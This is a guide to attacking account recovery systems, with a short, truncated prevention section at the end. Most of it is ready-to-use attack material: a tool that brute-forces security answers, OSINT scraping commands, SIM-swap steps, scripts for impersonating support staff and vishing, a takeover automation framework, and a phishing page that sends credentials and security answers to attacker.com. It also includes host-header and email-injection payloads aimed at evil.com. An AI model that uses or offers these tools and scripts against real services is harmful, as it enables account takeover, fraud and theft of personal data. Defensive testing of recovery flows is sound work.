# Account Recovery Attacks - Security Research Guide

## Overview

Account recovery mechanisms are designed to help legitimate users regain access to their accounts. However, these same mechanisms often become critical attack vectors for account takeover. This document covers comprehensive attack techniques against account recovery systems, including security question weaknesses, recovery mechanism flaws, and multi-stage account takeover chains.

---

## 1. Recovery Mechanism Flaws

### 1.1 Security Question Weaknesses

**1.1.1 Inherent Weaknesses in Security Questions**

Security questions suffer from fundamental design flaws:

| Question Type | Weakness | Attack Method |
|--------------|----------|---------------|
| Static personal data | OSINT discoverable | Social media research |
| Common answers | Low entropy | Dictionary attacks |
| Changing answers | User forgets | Support exploitation |
| Cultural bias | Limited applicability | Targeted guessing |

**Common Weak Security Questions:**
```
# Questions with public/guessable answers
- What is your mother's maiden name? (Public records, obituaries)
- What city were you born in? (LinkedIn, social media)
- What high school did you attend? (Facebook, yearbooks)
- What was your first car? (Limited popular models)
- What is your pet's name? (Social media photos)
- What is your favorite sports team? (Public profiles)
```

**1.1.2 Security Question Enumeration:**
```bash
# Enumerate available security questions
curl -s "https://target.com/api/security-questions" | jq .

# Check if questions are revealed for any user
curl -s "https://target.com/account/recovery?email=victim@example.com" | \
  grep -oP 'question["\s:]+[^"<]+'

# Test if questions differ per user (enumeration)
for email in user1@example.com user2@example.com admin@example.com; do
  echo "=== $email ==="
  curl -s "https://target.com/recovery/questions?email=$email" | jq '.question'
done
```

**1.1.3 Security Question Brute Force:**
```python
#!/usr/bin/env python3
"""
Security Question Answer Brute Force Tool
"""

import requests
from concurrent.futures import ThreadPoolExecutor
import time

class SecurityQuestionAttacker:
    def __init__(self, target_url, email):
        self.target_url = target_url
        self.email = email
        self.session = requests.Session()

        # Common answer wordlists by question type
        self.wordlists = {
            'maiden_name': [
                'Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia',
                'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Hernandez',
                'Lopez', 'Wilson', 'Anderson', 'Thomas', 'Taylor', 'Moore'
            ],
            'city': [
                'New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix',
                'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin',
                'London', 'Manchester', 'Birmingham', 'Toronto', 'Vancouver'
            ],
            'pet_name': [
                'Max', 'Bella', 'Charlie', 'Lucy', 'Cooper', 'Buddy',
                'Rocky', 'Bear', 'Duke', 'Sadie', 'Tucker', 'Jack',
                'Chloe', 'Molly', 'Bailey', 'Maggie', 'Sophie', 'Daisy'
            ],
            'car': [
                'Honda Civic', 'Toyota Camry', 'Ford F-150', 'Chevrolet',
                'Honda Accord', 'Toyota Corolla', 'Ford Mustang', 'BMW',
                'Mercedes', 'Volkswagen', 'Nissan', 'Hyundai'
            ],
            'school': [
                # Would be populated based on target's location
            ],
            'color': [
                'Blue', 'Red', 'Green', 'Black', 'White', 'Purple',
                'Yellow', 'Orange', 'Pink', 'Silver', 'Gold'
            ],
            'food': [
                'Pizza', 'Burger', 'Pasta', 'Sushi', 'Tacos', 'Steak',
                'Chicken', 'Salad', 'Ice cream', 'Chocolate', 'Chinese'
            ]
        }

    def get_question(self):
        """Retrieve security question for user"""
        response = self.session.get(
            f"{self.target_url}/recovery/question",
            params={'email': self.email}
        )
        return response.json().get('question', '')

    def identify_question_type(self, question):
        """Identify question type for wordlist selection"""
        question_lower = question.lower()

        if 'maiden' in question_lower:
            return 'maiden_name'
        elif 'city' in question_lower or 'born' in question_lower:
            return 'city'
        elif 'pet' in question_lower:
            return 'pet_name'
        elif 'car' in question_lower:
            return 'car'
        elif 'school' in question_lower:
            return 'school'
        elif 'color' in question_lower:
            return 'color'
        elif 'food' in question_lower or 'meal' in question_lower:
            return 'food'
        return None

    def try_answer(self, answer):
        """Submit answer attempt"""
        response = self.session.post(
            f"{self.target_url}/recovery/verify",
            data={
                'email': self.email,
                'answer': answer
            },
            timeout=10
        )

        # Check for success indicators
        if response.status_code == 200:
            if 'success' in response.text.lower() or \
               'correct' in response.text.lower() or \
               'token' in response.text.lower():
                return True, response.text
        return False, None

    def brute_force(self, wordlist=None, threads=5):
        """Execute brute force attack"""
        question = self.get_question()
        print(f"[*] Security question: {question}")

        if not wordlist:
            q_type = self.identify_question_type(question)
            if q_type:
                wordlist = self.wordlists.get(q_type, [])
                print(f"[*] Using {q_type} wordlist ({len(wordlist)} entries)")
            else:
                print("[!] Could not identify question type")
                return None

        # Brute force with rate limiting
        for answer in wordlist:
            success, response = self.try_answer(answer)
            if success:
                print(f"[+] Correct answer found: {answer}")
                return answer
            time.sleep(0.5)  # Rate limiting

        print("[-] No valid answer found")
        return None

# Usage
# attacker = SecurityQuestionAttacker("https://target.com", "victim@example.com")
# attacker.brute_force()
```

**1.1.4 OSINT for Security Question Answers:**
```bash
# Automated OSINT gathering
# Mother's maiden name - obituaries, genealogy sites
curl -s "https://www.findagrave.com/memorial/search?firstname=victim&lastname=lastname" | \
  grep -oP 'maiden name[^<]+' | head -5

# Birth city - social media
# Use tools like sherlock, socialscan

# Pet names from social media
# Instagram hashtag analysis
# Facebook photo captions

# School information
curl -s "https://www.linkedin.com/in/victim-profile" | \
  grep -oP 'school[^"]+'

# Common data aggregation sites
# - whitepages.com
# - truepeoplesearch.com
# - beenverified.com
# - spokeo.com
```

### 1.2 Recovery Email Takeover

**1.2.1 Expired Domain Takeover:**
```bash
# Check if recovery email domain is expired/available
whois $(echo "victim@oldcompany.com" | cut -d@ -f2) | grep -i "expir"

# Check domain availability
curl -s "https://api.domaintools.com/v1/available?domain=oldcompany.com"

# Monitor domain expiration
# Tools: domainwatcher, expireddomains.net
```

**Attack Flow:**
1. Identify target's recovery email address
2. Check if domain is expired or about to expire
3. Register the expired domain
4. Set up catch-all email on the domain
5. Initiate password reset for target account
6. Receive reset email on controlled domain
7. Complete account takeover

**1.2.2 Email Provider Vulnerabilities:**
```bash
# Check for email provider weaknesses
# - Compromised email services
# - Insecure email configurations
# - Legacy email protocols (POP3/IMAP without TLS)

# Test if email provider allows subdomain emails
curl -X POST "https://target.com/recovery" \
  -d "email=victim@subdomain.email-provider.com"

# Test email normalization issues
curl -X POST "https://target.com/recovery" \
  -d "email=victim+attacker@gmail.com"
```

**1.2.3 Email Address Reassignment:**
```python
# Some services allow email reuse after deletion
# Attack: Register same email address after victim deletes account

# Check if email is available for registration
def check_email_availability(email_provider, email):
    """Check if email can be registered"""
    endpoints = {
        'gmail': 'https://accounts.google.com/signup/v2/webcreateaccount',
        'outlook': 'https://signup.live.com/signup',
        'yahoo': 'https://login.yahoo.com/account/create'
    }

    # Implementation depends on provider
    pass
```

### 1.3 Phone-Based Recovery Bypass

**1.3.1 SIM Swapping Attack Chain:**
```
Attack Flow:
1. Gather victim's personal information (SSN, DOB, address)
2. Contact victim's mobile carrier
3. Social engineer carrier support
4. Request SIM swap/port to attacker's SIM
5. Receive victim's SMS/calls
6. Initiate account recovery via SMS
7. Receive OTP on attacker's device
8. Complete account takeover
```

**Information Required for SIM Swap:**
```
- Full name
- Date of birth
- Social Security Number (last 4 digits)
- Account PIN (often 4 digits)
- Billing address
- Recent call history
- Last payment amount
```

**1.3.2 SMS Interception Techniques:**
```bash
# SS7 vulnerabilities (requires specialized access)
# - Interception of SMS via SS7 protocol
# - Location tracking
# - Call interception

# Malware-based interception
# - SMS forwarding apps
# - Banking trojans

# Voicemail hijacking
# Some providers allow SMS to be delivered to voicemail
# Default voicemail PINs are often weak (1234, 0000, last 4 of phone)
```

**1.3.3 Phone Number Recycling:**
```python
# Phone numbers are reassigned after deactivation
# Attack window: 90-365 days after number is released

def check_phone_recycling_risk(phone_number):
    """
    Check if phone number might be recycled
    - Recently ported numbers
    - Prepaid numbers
    - Numbers from specific carriers
    """
    # Implementation depends on available APIs
    pass
```

**1.3.4 VoIP/Virtual Number Abuse:**
```bash
# Services that provide virtual numbers
# - Google Voice
# - TextNow
# - Burner apps

# Some applications don't block VoIP numbers
curl -X POST "https://target.com/send-sms-code" \
  -d "phone=+1GOOGLE_VOICE_NUMBER"
```

### 1.4 Identity Verification Bypass

**1.4.1 ID Document Bypass:**
```python
# Testing ID verification implementations

class IDVerificationBypass:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_image_reuse(self, id_image):
        """Test if same ID image is accepted multiple times"""
        # Upload same image for different accounts
        pass

    def test_edited_documents(self, id_image):
        """Test if obviously edited documents are accepted"""
        # Modify metadata, add text overlays
        pass

    def test_screenshot_acceptance(self, id_image):
        """Test if screenshots of IDs are accepted"""
        # Take screenshot, upload instead of original
        pass

    def test_sample_documents(self):
        """Test if sample/template documents are accepted"""
        # Use publicly available ID templates
        pass

    def test_file_type_bypass(self, id_image):
        """Test file type restrictions"""
        payloads = [
            'id.jpg.php',
            'id.jpg%00.php',
            'id.php;.jpg'
        ]
        pass
```

**1.4.2 Knowledge-Based Verification Bypass:**
```bash
# KBA questions from credit bureaus are often OSINT-able

# Common KBA question sources:
# - Property records (address history)
# - Court records (legal history)
# - Credit reports (loan history)
# - Public records (marriage, birth)

# Testing KBA implementation
curl -X POST "https://target.com/api/verify-identity" \
  -H "Content-Type: application/json" \
  -d '{
    "ssn_last4": "1234",
    "dob": "1990-01-01",
    "questions": [
      {"id": 1, "answer": "None of the above"},
      {"id": 2, "answer": "None of the above"},
      {"id": 3, "answer": "None of the above"}
    ]
  }'

# "None of the above" is often a valid answer that attackers can guess
```

### 1.5 Support Channel Exploitation

**1.5.1 Social Engineering Support Staff:**
```
Attack Vectors:
1. Impersonation of account owner
   - "I lost access to my email and phone"
   - "I'm traveling and can't receive SMS"

2. Authority exploitation
   - "I'm the CEO/executive and need immediate access"
   - "Legal/compliance requires immediate resolution"

3. Emotional manipulation
   - "My account was hacked and I'm locked out"
   - "I have a family emergency"

4. Technical pretexting
   - "Your system sent me to the wrong email"
   - "The verification code isn't working"
```

**1.5.2 Support Ticket Manipulation:**
```bash
# Test support ticket creation without authentication
curl -X POST "https://target.com/support/ticket" \
  -d "email=victim@example.com" \
  -d "subject=Account Recovery" \
  -d "message=Please reset my account"

# Test ticket number enumeration
for i in $(seq 1000 2000); do
  response=$(curl -s "https://target.com/support/ticket/$i")
  if [[ ! "$response" =~ "not found" ]]; then
    echo "Ticket $i exists"
  fi
done

# Test ticket hijacking
curl -X POST "https://target.com/support/ticket/1234/reply" \
  -d "message=Here is my new email: attacker@evil.com"
```

**1.5.3 Chat Support Exploitation:**
```python
# Automated chat support testing

import requests
import json

class SupportChatExploiter:
    def __init__(self, chat_endpoint):
        self.endpoint = chat_endpoint
        self.session = requests.Session()

    def test_identity_verification(self, victim_email):
        """Test what verification is required"""

        # Start chat session
        self.session.post(f"{self.endpoint}/start")

        # Claim to be account owner
        messages = [
            "Hi, I need help accessing my account",
            f"My email is {victim_email}",
            "I lost access to my phone and email",
            "Can you send a reset link to a different email?",
            "I can verify my identity with my last transaction",
        ]

        for msg in messages:
            response = self.session.post(
                f"{self.endpoint}/message",
                json={'message': msg}
            )
            print(f"User: {msg}")
            print(f"Support: {response.json().get('reply')}\n")

# Track what information is requested vs. bypassed
```

---

## 2. Account Takeover Chains

### 2.1 Combining Vulnerabilities

**2.1.1 Multi-Stage Attack Patterns:**

```
Chain 1: Email Enumeration -> OSINT -> Security Question
1. Use timing attack to enumerate valid emails
2. Gather OSINT on identified users
3. Answer security questions from gathered data
4. Complete account takeover

Chain 2: Subdomain Takeover -> Email Intercept -> Reset
1. Discover abandoned subdomain (e.g., old.target.com)
2. Take over subdomain
3. If subdomain had email MX, intercept emails
4. Request password reset
5. Receive reset at controlled subdomain

Chain 3: IDOR -> Account Info -> Recovery
1. Find IDOR to access other users' data
2. Extract recovery email, phone, security questions
3. Use extracted data for account recovery
4. Take over account

Chain 4: XSS -> Session -> Recovery Email Change
1. Find stored XSS vulnerability
2. Steal admin session
3. Change victim's recovery email
4. Request password reset
5. Complete takeover
```

**2.1.2 Attack Chain Implementation:**
```python
#!/usr/bin/env python3
"""
Account Takeover Chain Automation Framework
"""

import requests
from dataclasses import dataclass
from typing import List, Optional, Dict
import logging

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

@dataclass
class VulnerabilityChain:
    name: str
    steps: List[str]
    success_rate: float
    complexity: str

class AccountTakeoverFramework:
    def __init__(self, target_domain: str):
        self.target = target_domain
        self.session = requests.Session()
        self.findings = []
        self.chains = []

    def phase1_reconnaissance(self, target_email: str) -> Dict:
        """Gather information about target"""
        recon_data = {
            'email_valid': False,
            'recovery_options': [],
            'security_questions': [],
            'phone_last_digits': None,
            'recovery_email_domain': None
        }

        # Email enumeration
        logger.info("[Phase 1] Checking email validity...")
        recon_data['email_valid'] = self._check_email_exists(target_email)

        # Get recovery options
        logger.info("[Phase 1] Enumerating recovery options...")
        recon_data['recovery_options'] = self._get_recovery_options(target_email)

        # Extract partial info (masked phone, email)
        logger.info("[Phase 1] Extracting masked recovery info...")
        masked_info = self._get_masked_recovery_info(target_email)
        recon_data.update(masked_info)

        return recon_data

    def phase2_vulnerability_scan(self) -> List[str]:
        """Scan for exploitable vulnerabilities"""
        vulnerabilities = []

        logger.info("[Phase 2] Scanning for vulnerabilities...")

        # Test host header poisoning
        if self._test_host_poisoning():
            vulnerabilities.append('HOST_HEADER_POISONING')

        # Test token leakage
        if self._test_token_leakage():
            vulnerabilities.append('TOKEN_LEAKAGE')

        # Test security question weakness
        if self._test_weak_security_questions():
            vulnerabilities.append('WEAK_SECURITY_QUESTIONS')

        # Test rate limiting
        if self._test_rate_limiting():
            vulnerabilities.append('NO_RATE_LIMITING')

        # Test IDOR in recovery flow
        if self._test_idor_recovery():
            vulnerabilities.append('IDOR_RECOVERY')

        self.findings = vulnerabilities
        return vulnerabilities

    def phase3_chain_construction(self, recon_data: Dict, vulnerabilities: List[str]) -> List[VulnerabilityChain]:
        """Construct viable attack chains"""
        chains = []

        logger.info("[Phase 3] Constructing attack chains...")

        # Chain: Host Header Poisoning
        if 'HOST_HEADER_POISONING' in vulnerabilities:
            chains.append(VulnerabilityChain(
                name="Host Header Password Reset Poisoning",
                steps=[
                    "1. Send password reset with poisoned Host header",
                    "2. Victim clicks link in email",
                    "3. Token captured at attacker server",
                    "4. Use token to reset password"
                ],
                success_rate=0.7,  # Requires victim interaction
                complexity="Medium"
            ))

        # Chain: Token + No Rate Limit
        if 'TOKEN_LEAKAGE' in vulnerabilities:
            chains.append(VulnerabilityChain(
                name="Token Leakage Direct Takeover",
                steps=[
                    "1. Request password reset",
                    "2. Extract token from response",
                    "3. Use token to reset password"
                ],
                success_rate=0.95,
                complexity="Low"
            ))

        # Chain: Security Questions + OSINT
        if 'WEAK_SECURITY_QUESTIONS' in vulnerabilities:
            chains.append(VulnerabilityChain(
                name="Security Question Brute Force",
                steps=[
                    "1. Retrieve security question",
                    "2. Gather OSINT on target",
                    "3. Brute force with targeted wordlist",
                    "4. Answer question to gain access"
                ],
                success_rate=0.5,
                complexity="Medium"
            ))

        # Chain: IDOR + Recovery Info
        if 'IDOR_RECOVERY' in vulnerabilities:
            chains.append(VulnerabilityChain(
                name="IDOR Recovery Email Change",
                steps=[
                    "1. Exploit IDOR to access victim profile",
                    "2. Change recovery email to attacker's",
                    "3. Request password reset",
                    "4. Complete takeover"
                ],
                success_rate=0.9,
                complexity="Low"
            ))

        self.chains = chains
        return chains

    def _check_email_exists(self, email: str) -> bool:
        """Check if email exists via timing/response analysis"""
        # Implementation
        return True

    def _get_recovery_options(self, email: str) -> List[str]:
        """Get available recovery options"""
        # Implementation
        return ['email', 'phone', 'security_question']

    def _get_masked_recovery_info(self, email: str) -> Dict:
        """Extract masked recovery information"""
        # Implementation
        return {}

    def _test_host_poisoning(self) -> bool:
        """Test for host header poisoning"""
        # Implementation
        return False

    def _test_token_leakage(self) -> bool:
        """Test for token leakage in response"""
        # Implementation
        return False

    def _test_weak_security_questions(self) -> bool:
        """Test for weak security questions"""
        # Implementation
        return False

    def _test_rate_limiting(self) -> bool:
        """Test for rate limiting"""
        # Implementation
        return False

    def _test_idor_recovery(self) -> bool:
        """Test for IDOR in recovery flow"""
        # Implementation
        return False

    def generate_report(self) -> str:
        """Generate attack chain report"""
        report = f"""
Account Takeover Analysis Report
================================
Target: {self.target}

Vulnerabilities Found:
{chr(10).join(f'  - {v}' for v in self.findings)}

Viable Attack Chains:
"""
        for chain in self.chains:
            report += f"""
{chain.name}
  Complexity: {chain.complexity}
  Success Rate: {chain.success_rate * 100}%
  Steps:
{chr(10).join(f'    {step}' for step in chain.steps)}
"""
        return report

# Usage
# framework = AccountTakeoverFramework("target.com")
# recon = framework.phase1_reconnaissance("victim@example.com")
# vulns = framework.phase2_vulnerability_scan()
# chains = framework.phase3_chain_construction(recon, vulns)
# print(framework.generate_report())
```

### 2.2 Social Engineering + Technical Attacks

**2.2.1 Phishing + Account Recovery:**
```html
<!-- Phishing page that captures credentials AND triggers recovery -->
<!DOCTYPE html>
<html>
<head>
    <title>Account Verification Required</title>
</head>
<body>
    <div class="login-form">
        <h2>Verify Your Identity</h2>
        <form id="phish-form" action="https://attacker.com/capture" method="POST">
            <input type="email" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required>

            <!-- Hidden fields for recovery info -->
            <input type="hidden" name="mother_maiden" id="maiden">
            <input type="hidden" name="pet_name" id="pet">

            <button type="submit">Verify</button>
        </form>

        <!-- Secondary form to harvest security questions -->
        <div id="security-section" style="display:none;">
            <h3>Additional Verification</h3>
            <p>What is your mother's maiden name?</p>
            <input type="text" id="maiden-input">
            <p>What is your pet's name?</p>
            <input type="text" id="pet-input">
        </div>
    </div>

    <script>
        // Capture entered data
        document.getElementById('phish-form').onsubmit = function() {
            document.getElementById('maiden').value = document.getElementById('maiden-input').value;
            document.getElementById('pet').value = document.getElementById('pet-input').value;
        };
    </script>
</body>
</html>
```

**2.2.2 Vishing (Voice Phishing) Support Attack:**
```
Script Template for Vishing Attack:

"Hello, this is [Name] from [Target Company] security team.
We've detected suspicious activity on your account.
For your protection, we need to verify your identity.

Can you confirm:
- Your email address?
- The last 4 digits of your phone number on file?
- Your security question answer?

We're going to send you a verification code. Please read it back to me."

[Attacker initiates real password reset]
[Victim reads back the legitimate code]
[Attacker uses code to complete takeover]
```

### 2.3 Third-Party Compromise

**2.3.1 OAuth/Social Login Takeover:**
```python
# If account uses social login, compromising the linked account = takeover

class SocialLoginAttack:
    def __init__(self, target_app):
        self.target = target_app
        self.social_providers = ['google', 'facebook', 'apple', 'twitter', 'github']

    def enumerate_linked_accounts(self, email):
        """Determine which social providers are linked"""
        linked = []

        for provider in self.social_providers:
            response = requests.post(
                f"{self.target}/auth/{provider}/check",
                json={'email': email}
            )
            if response.json().get('linked'):
                linked.append(provider)

        return linked

    def test_provider_linking_vulnerability(self):
        """Test if attackers can link their social account to victim"""
        # Some apps allow linking without verification
        # Attack: Create social account with victim's email before they do
        pass

    def test_token_reuse(self, stolen_token):
        """Test if OAuth tokens can be reused across applications"""
        # Some tokens have overly broad scopes
        pass
```

**2.3.2 Credential Stuffing from Breaches:**
```bash
# Check if email appears in breaches
# Tools: haveibeenpwned API, dehashed, etc.

# Using have I been pwned API
curl -s -H "hibp-api-key: YOUR_KEY" \
  "https://haveibeenpwned.com/api/v3/breachedaccount/victim@example.com"

# Check for password reuse via recovery email
# If victim's recovery email is found in breach,
# try those passwords on recovery email provider
```

**2.3.3 Connected App Exploitation:**
```python
# Exploit apps connected to target account

def enumerate_connected_apps(session, target_url):
    """Find apps connected to account"""
    response = session.get(f"{target_url}/settings/connected-apps")
    # Parse and return connected applications
    return []

def find_vulnerable_connected_app(apps):
    """Find connected app with known vulnerabilities"""
    # Check for:
    # - Apps with excessive permissions
    # - Apps that can read/send emails
    # - Apps that can modify account settings
    pass
```

### 2.4 Credential Recovery Enumeration

**2.4.1 User Enumeration via Recovery Flow:**
```bash
# Response-based enumeration
curl -s "https://target.com/forgot-password" -d "email=valid@example.com" > valid.txt
curl -s "https://target.com/forgot-password" -d "email=invalid@nonexistent.com" > invalid.txt
diff valid.txt invalid.txt

# Timing-based enumeration
for email in $(cat emails.txt); do
  start=$(date +%s%N)
  curl -s -o /dev/null "https://target.com/forgot-password" -d "email=$email"
  end=$(date +%s%N)
  echo "$email: $(( ($end - $start) / 1000000 ))ms"
done

# Error message enumeration
for email in $(cat emails.txt); do
  response=$(curl -s "https://target.com/forgot-password" -d "email=$email")
  if [[ "$response" =~ "email sent" ]]; then
    echo "VALID: $email"
  elif [[ "$response" =~ "not found" ]]; then
    echo "INVALID: $email"
  fi
done
```

**2.4.2 Username from Recovery Hints:**
```bash
# Some systems reveal partial usernames
curl -s "https://target.com/forgot-password" \
  -d "phone=+1234567890" | grep -oP 'username[^"]+'

# Extract hints from responses
# "We sent an email to j***@gmail.com"
# "The account associated with +1***456***0"
```

---

## 3. Testing Tools and Commands

### 3.1 Automated Testing Suite

```bash
# Install dependencies
pip install requests beautifulsoup4 selenium

# Run comprehensive account recovery test
python3 account_recovery_tester.py --target https://target.com --email victim@example.com
```

```python
#!/usr/bin/env python3
"""
account_recovery_tester.py
Comprehensive Account Recovery Vulnerability Scanner
"""

import requests
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin
import json

class AccountRecoveryTester:
    def __init__(self, target, email):
        self.target = target
        self.email = email
        self.session = requests.Session()
        self.results = []

        # Common recovery endpoints
        self.endpoints = [
            '/forgot-password',
            '/password/reset',
            '/account/recovery',
            '/api/v1/auth/forgot-password',
            '/api/v1/users/forgot-password',
            '/api/auth/reset-password',
            '/reset-password',
            '/recover',
            '/account/forgot'
        ]

    def find_recovery_endpoint(self):
        """Discover password recovery endpoint"""
        print("[*] Discovering recovery endpoints...")

        for endpoint in self.endpoints:
            url = urljoin(self.target, endpoint)
            try:
                response = self.session.get(url, timeout=5)
                if response.status_code in [200, 405]:  # 405 = method not allowed (POST only)
                    print(f"  [+] Found: {url}")
                    return url
            except:
                pass
        return None

    def test_user_enumeration(self, endpoint):
        """Test for user enumeration"""
        print("\n[*] Testing user enumeration...")

        # Test valid email
        start = time.time()
        r1 = self.session.post(endpoint, data={'email': self.email})
        t1 = time.time() - start

        # Test invalid email
        start = time.time()
        r2 = self.session.post(endpoint, data={'email': 'nonexistent@invalid.com'})
        t2 = time.time() - start

        # Compare responses
        if r1.text != r2.text:
            self.results.append({
                'vulnerability': 'User Enumeration',
                'type': 'Response Content',
                'severity': 'LOW'
            })
            print("  [!] User enumeration via response content")

        if abs(t1 - t2) > 0.5:
            self.results.append({
                'vulnerability': 'User Enumeration',
                'type': 'Timing Attack',
                'severity': 'LOW'
            })
            print("  [!] User enumeration via timing difference")

    def test_host_header_poisoning(self, endpoint):
        """Test for host header poisoning"""
        print("\n[*] Testing host header poisoning...")

        headers = [
            ('Host', 'evil.attacker.com'),
            ('X-Forwarded-Host', 'evil.attacker.com'),
            ('X-Host', 'evil.attacker.com'),
            ('X-Forwarded-Server', 'evil.attacker.com'),
        ]

        for header_name, header_value in headers:
            response = self.session.post(
                endpoint,
                data={'email': self.email},
                headers={header_name: header_value}
            )

            if 'evil.attacker.com' in response.text:
                self.results.append({
                    'vulnerability': 'Host Header Poisoning',
                    'header': header_name,
                    'severity': 'HIGH'
                })
                print(f"  [!] Vulnerable via {header_name}")

    def test_email_parameter_manipulation(self, endpoint):
        """Test email parameter manipulation"""
        print("\n[*] Testing email parameter manipulation...")

        test_cases = [
            # Array injection
            {'email[]': [self.email, 'attacker@evil.com']},
            # Comma separation
            {'email': f'{self.email},attacker@evil.com'},
            # CRLF injection
            {'email': f'{self.email}%0aCc:attacker@evil.com'},
            # Parameter pollution
            {'email': self.email, 'email': 'attacker@evil.com'},
        ]

        for case in test_cases:
            response = self.session.post(endpoint, data=case)
            if 'success' in response.text.lower():
                self.results.append({
                    'vulnerability': 'Email Parameter Manipulation',
                    'payload': str(case),
                    'severity': 'HIGH'
                })
                print(f"  [!] Possible manipulation with: {case}")

    def test_rate_limiting(self, endpoint):
        """Test for rate limiting"""
        print("\n[*] Testing rate limiting...")

        success_count = 0
        for i in range(50):
            response = self.session.post(
                endpoint,
                data={'email': self.email}
            )
            if response.status_code == 200:
                success_count += 1

        if success_count >= 45:  # 90% success rate
            self.results.append({
                'vulnerability': 'No Rate Limiting',
                'requests': success_count,
                'severity': 'MEDIUM'
            })
            print(f"  [!] No rate limiting detected ({success_count}/50 succeeded)")

    def test_token_in_response(self, endpoint):
        """Test if token is leaked in response"""
        print("\n[*] Testing for token leakage...")

        response = self.session.post(endpoint, data={'email': self.email})

        patterns = ['token', 'reset_token', 'resetToken', 'confirmation']
        for pattern in patterns:
            if pattern in response.text.lower():
                self.results.append({
                    'vulnerability': 'Token Leakage',
                    'pattern': pattern,
                    'severity': 'CRITICAL'
                })
                print(f"  [!] Possible token leakage (pattern: {pattern})")
                break

    def run_all_tests(self):
        """Execute all tests"""
        print(f"\n{'='*60}")
        print("Account Recovery Vulnerability Scanner")
        print(f"Target: {self.target}")
        print(f"Email: {self.email}")
        print(f"{'='*60}")

        endpoint = self.find_recovery_endpoint()
        if not endpoint:
            print("[-] No recovery endpoint found")
            return

        self.test_user_enumeration(endpoint)
        self.test_host_header_poisoning(endpoint)
        self.test_email_parameter_manipulation(endpoint)
        self.test_rate_limiting(endpoint)
        self.test_token_in_response(endpoint)

        self.print_report()

    def print_report(self):
        """Print test results"""
        print(f"\n{'='*60}")
        print(f"RESULTS: Found {len(self.results)} vulnerabilities")
        print(f"{'='*60}")

        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        sorted_results = sorted(self.results, key=lambda x: severity_order.get(x['severity'], 4))

        for r in sorted_results:
            print(f"\n[{r['severity']}] {r['vulnerability']}")
            for k, v in r.items():
                if k not in ['vulnerability', 'severity']:
                    print(f"  {k}: {v}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Account Recovery Vulnerability Scanner')
    parser.add_argument('--target', required=True, help='Target URL')
    parser.add_argument('--email', required=True, help='Test email address')
    args = parser.parse_args()

    tester = AccountRecoveryTester(args.target, args.email)
    tester.run_all_tests()
```

### 3.2 Nuclei Templates

```yaml
# account-recovery-enumeration.yaml
id: account-recovery-enumeration

info:
  name: Account Recovery User Enumeration
  author: security-research
  severity: low
  tags: account-recovery,enumeration

requests:
  - method: POST
    path:
      - "{{BaseURL}}/forgot-password"
      - "{{BaseURL}}/api/auth/forgot-password"

    body: "email=valid-user@target.com"

    matchers-condition: or
    matchers:
      - type: word
        words:
          - "email sent"
          - "reset link"
          - "check your email"
        condition: or

      - type: word
        words:
          - "user not found"
          - "email not registered"
          - "invalid email"
        negative: true
```

```yaml
# security-question-weakness.yaml
id: security-question-weakness

info:
  name: Weak Security Questions Detection
  author: security-research
  severity: medium
  tags: account-recovery,security-questions

requests:
  - method: GET
    path:
      - "{{BaseURL}}/account/security-questions"
      - "{{BaseURL}}/api/security-questions"

    matchers:
      - type: word
        words:
          - "mother's maiden"
          - "pet name"
          - "favorite color"
          - "born in"
          - "first car"
        condition: or
```

### 3.3 Burp Suite Configuration

```
# Burp Suite Professional - Account Recovery Testing

## Intruder Attack Configurations

### Security Question Brute Force
Attack Type: Sniper
Payload Position: answer parameter
Payload Type: Simple List
Payload Options:
  - Load from file: /usr/share/wordlists/names.txt
  - Add common answers manually
Grep Match: success, correct, valid, next step

### Token Brute Force
Attack Type: Sniper
Payload Position: token parameter
Payload Type: Numbers (for numeric tokens)
Options:
  From: 000000
  To: 999999
  Step: 1
  Format: %06d
Resource Pool: 100 concurrent requests

## Scanner Configuration
Active Scanning: Enable
Issue Types:
  - Host header injection
  - User enumeration
  - Parameter tampering
```

---

## 4. Prevention and Mitigation

### 4.1 Security Question Best Practices

```python
# If security questions must be used:

class SecureSecurityQuestions:
    """Implement more secure security questions"""

    # Use questions with many possible answers
    GOOD_QUESTIONS = [
        "What was your childhood nickname that only family knew?",
        "What was the name of your first stuffed animal?",
        "What was the make and model of your first car's engine?",
        "What was the street name of the house you lived in in third grade?",
    ]

    # Avoid these question types
    BAD_QUESTIONS = [
        "Mother's maiden name",  # Public records
        "High school name",      # Social media
        "City of birth",         # Very limited answers
        "Favorite color",        # Few options
    ]

    def validate_answer(self, question, answer):
        """Validate answer quality"""
        if len(answer) < 4:
            return False, "Answer too short"

        # Check against common answers
        common_answers = ['password', '123456', 'qwerty', 'none']
        if answer.lower() in common_answers:
            return False, "Answer too common"

        return True, "OK"

    def store_answer(self, answer, user_id):
        """Store answer securely (hashed)"""
        import bcrypt
        # Normalize: lowercase, strip whitespace
        normalized = answer.lower().strip()
        hashed = bcrypt.hashpw(normalized.encode(), bcrypt.gensalt())
        # Store hashed value
        return hashed
```

### 4.2 Secure Recovery Flow Design

```python
# Multi-factor recovery implementation

class SecureAccountRecovery:
    def __init__(self):
        self.verification_requirements = 2  # Minimum factors required

    def initiate_recovery(self, user):
        """Start secure recovery process"""
        factors = []

        # Factor 1: Email verification
        if user.email:
            factors.append(('email', self.send_email_code(user.email)))

        # Factor 2: Phone verification
        if user.phone:
            factors.append(('phone', self.send_sms_code(user.phone)))

        # Factor 3: Trusted device
        if user.trusted_devices:
            factors.append(('device', self.notify_devices(user.trusted_devices)))

        # Factor 4: Identity verification (last resort)
        factors.append(('identity', self.request_id_verification()))

        return factors

    def verify_recovery(self, user, verifications):
        """Verify multiple factors before allowing recovery"""
        verified_count = sum(1 for v in verifications if v['verified'])

        if verified_count < self.verification_requirements:
            return False, f"Need {self.verification_requirements} verified factors"

        # Add delay to prevent rapid attempts
        time.sleep(2)

        return True, self.generate_recovery_token(user)
```

### 4.3 Rate Limiting and Monitoring

```python
# Rate limiting for recovery attempts

from functools import wraps
import redis

redis_client = redis.Redis()

def rate_limit_recovery(max_attempts=5, window=3600):
